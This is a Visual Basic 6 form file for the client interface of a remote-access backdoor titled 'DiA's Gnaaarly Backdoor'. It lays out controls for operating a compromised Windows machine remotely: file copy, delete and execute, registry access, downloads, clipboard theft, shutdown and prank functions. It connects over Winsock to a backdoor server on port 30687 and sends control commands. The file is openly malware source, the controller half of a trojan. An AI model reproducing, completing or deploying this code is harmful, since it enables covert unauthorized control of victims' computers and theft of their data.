VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
Begin VB.Form frmMain 
   BorderStyle     =   0  'Kein
   Caption         =   "DiA's Gnaaarly Backdoor  ::  GUI Client"
   ClientHeight    =   7335
   ClientLeft      =   0
   ClientTop       =   0
   ClientWidth     =   7470
   Icon            =   "frmMain.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   7335
   ScaleWidth      =   7470
   StartUpPosition =   2  'Bildschirmmitte
   Begin VB.Frame fraHelp 
      Caption         =   "HELP"
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   9.75
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   735
      Left            =   120
      TabIndex        =   10
      Top             =   6480
      Width           =   7215
      Begin VB.CommandButton cmdExit 
         Caption         =   "EXIT WIN"
         Enabled         =   0   'False
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   375
         Left            =   6000
         TabIndex        =   18
         ToolTipText     =   "reboot, shutdown"
         Top             =   240
         Width           =   1095
      End
      Begin VB.CommandButton cmdClip 
         Caption         =   "CLIP"
         Enabled         =   0   'False
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   375
         Left            =   5280
         TabIndex        =   17
         ToolTipText     =   "getclipboard, setclipboard"
         Top             =   240
         Width           =   735
      End
      Begin VB.CommandButton cmdInternet 
         Caption         =   "INTERNET"
         Enabled         =   0   'False
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   375
         Left            =   4200
         TabIndex        =   16
         ToolTipText     =   "download"
         Top             =   240
         Width           =   1095
      End
      Begin VB.CommandButton cmdRegistry 
         Caption         =   "REGISTRY"
         Enabled         =   0   'False
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   375
         Left            =   3000
         TabIndex        =   15
         Top             =   240
         Width           =   1215
      End
      Begin VB.CommandButton cmdFiles 
         Caption         =   "FILES"
         Enabled         =   0   'False
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   375
         Left            =   2280
         TabIndex        =   14
         ToolTipText     =   "copyfile, movefile, deletefile, execute"
         Top             =   240
         Width           =   735
      End
      Begin VB.CommandButton cmdLists 
         Caption         =   "LISTS"
         Enabled         =   0   'False
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   375
         Left            =   1560
         TabIndex        =   13
         ToolTipText     =   "dirlist, filelist"
         Top             =   240
         Width           =   735
      End
      Begin VB.CommandButton cmdPaths 
         Caption         =   "PATHS"
         Enabled         =   0   'False
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   375
         Left            =   720
         TabIndex        =   12
         ToolTipText     =   "windowspath, systempath, location, getdirectory, setdirectory"
         Top             =   240
         Width           =   855
      End
      Begin VB.CommandButton cmdFun 
         Caption         =   "FUN"
         Enabled         =   0   'False
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   375
         Left            =   120
         TabIndex        =   11
         ToolTipText     =   "msgbox, mouse, input, cdrom, start, monitor"
         Top             =   240
         Width           =   615
      End
   End
   Begin VB.CommandButton cmdCloseClient 
      Caption         =   "CLOSE CLIENT"
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   9
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   255
      Left            =   5760
      TabIndex        =   9
      Top             =   480
      Width           =   1575
   End
   Begin VB.CommandButton cmdCloseServer 
      Caption         =   "CLOSE SERVER"
      Enabled         =   0   'False
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   9
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   255
      Left            =   4200
      TabIndex        =   8
      Top             =   480
      Width           =   1575
   End
   Begin VB.Frame fraSend 
      Caption         =   "SEND"
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   9.75
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   735
      Left            =   120
      TabIndex        =   5
      Top             =   5640
      Width           =   7215
      Begin VB.CommandButton cmdSend 
         Caption         =   "SEND"
         Enabled         =   0   'False
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   375
         Left            =   5770
         TabIndex        =   7
         Top             =   240
         Width           =   1335
      End
      Begin VB.TextBox txtSend 
         Appearance      =   0  '2D
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   375
         Left            =   120
         TabIndex        =   6
         Top             =   240
         Width           =   5655
      End
   End
   Begin VB.Frame fraReturn 
      Caption         =   "RETURN"
      Height          =   4695
      Left            =   120
      TabIndex        =   3
      Top             =   840
      Width           =   7215
      Begin VB.TextBox txtReturn 
         Appearance      =   0  '2D
         BeginProperty Font 
            Name            =   "Arial"
            Size            =   9.75
            Charset         =   0
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   4335
         Left            =   120
         Locked          =   -1  'True
         MultiLine       =   -1  'True
         ScrollBars      =   2  'Vertikal
         TabIndex        =   4
         Text            =   "frmMain.frx":030A
         Top             =   240
         Width           =   6975
      End
   End
   Begin VB.CommandButton cmdConnect 
      Caption         =   "CONNECT"
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   9.75
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   255
      Left            =   3000
      TabIndex        =   2
      Top             =   480
      Width           =   1215
   End
   Begin VB.TextBox txtServerIP 
      Appearance      =   0  '2D
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   9.75
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   285
      Left            =   1080
      MaxLength       =   15
      TabIndex        =   1
      Text            =   "127.0.0.1"
      Top             =   480
      Width           =   1815
   End
   Begin MSWinsockLib.Winsock Winsock 
      Left            =   2400
      Top             =   2040
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
   Begin VB.Image imgCaption 
      Height          =   420
      Left            =   -840
      Picture         =   "frmMain.frx":031A
      Top             =   0
      Width           =   8325
   End
   Begin VB.Label lblServerIP 
      Caption         =   "Server IP :"
      BeginProperty Font 
         Name            =   "Arial"
         Size            =   9.75
         Charset         =   0
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      Height          =   255
      Left            =   120
      TabIndex        =   0
      Top             =   480
      Width           =   975
   End
End
Attribute VB_Name = "frmMain"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Sub cmdClip_Click()
    frmClipboard.Show
End Sub

Private Sub cmdCloseClient_Click()
    If cmdSend.Enabled = False Then
        End
    Else
        Winsock.SendData "!quit"
        cmdCloseServer.Enabled = False
        cmdSend.Enabled = False
    End If
End Sub

Private Sub cmdCloseServer_Click()
    Winsock.SendData "!close"
    cmdCloseServer.Enabled = False
    cmdSend.Enabled = False
End Sub

Private Sub cmdConnect_Click()
    Winsock.Connect txtServerIP.Text, 30687
End Sub

Private Sub cmdExit_Click()
    frmExitWin.Show
End Sub

Private Sub cmdFiles_Click()
    frmFiles.Show
End Sub

Private Sub cmdFun_Click()
    frmFun.Show
End Sub

Private Sub cmdInternet_Click()
    frmInternet.Show
End Sub

Private Sub cmdLists_Click()
    frmLists.Show
End Sub

Private Sub cmdPaths_Click()
    frmPaths.Show
End Sub

Private Sub cmdRegistry_Click()
    frmRegistry.Show
End Sub

Private Sub cmdSend_Click()
    SendCommand
End Sub

Private Sub Form_Load()
    Call MakeNoBorder_And_3D(Me)
End Sub

Private Sub Form_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
    Call MoveControl(Me, Button, Shift, X, Y)
End Sub

Private Sub imgCaption_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
    Call MoveControl(Me, Button, Shift, X, Y)
End Sub

Private Sub txtSend_KeyPress(KeyAscii As Integer)
    If KeyAscii = 13 Then cmdSend_Click
End Sub

Private Sub Winsock_Connect()
    cmdCloseServer.Enabled = True
    cmdSend.Enabled = True
    cmdFun.Enabled = True
    cmdPaths.Enabled = True
    cmdLists.Enabled = True
    cmdFiles.Enabled = True
    cmdRegistry.Enabled = True
    cmdInternet.Enabled = True
    cmdClip.Enabled = True
    cmdExit.Enabled = True
    
    txtReturn.Text = txtReturn.Text & "Connected." & vbCrLf & vbCrLf
End Sub

Private Sub Winsock_Close()
    cmdCloseServer.Enabled = False
    cmdSend.Enabled = False
    cmdFun.Enabled = False
    cmdPaths.Enabled = False
    cmdLists.Enabled = False
    cmdFiles.Enabled = False
    cmdRegistry.Enabled = False
    cmdInternet.Enabled = False
    cmdClip.Enabled = False
    cmdExit.Enabled = False
End Sub

Private Sub Winsock_DataArrival(ByVal bytesTotal As Long)
    Dim sData As String

    Winsock.GetData sData
  
    With txtReturn
        .SelStart = Len(.Text)
        .SelText = sData & vbCrLf & vbCrLf
    End With
    
    If sData = "Closed." Then
        End
    End If
    
    If sData = "Client quit." Then
        End
    End If
    
    txtSend.Text = ""
End Sub

Private Sub Winsock_Error(ByVal Number As Integer, Description As String, ByVal Scode As Long, ByVal Source As String, ByVal HelpFile As String, ByVal HelpContext As Long, CancelDisplay As Boolean)
    txtReturn.Text = txtReturn.Text & vbCrLf & "Cannot connect to " & txtServerIP.Text
End Sub
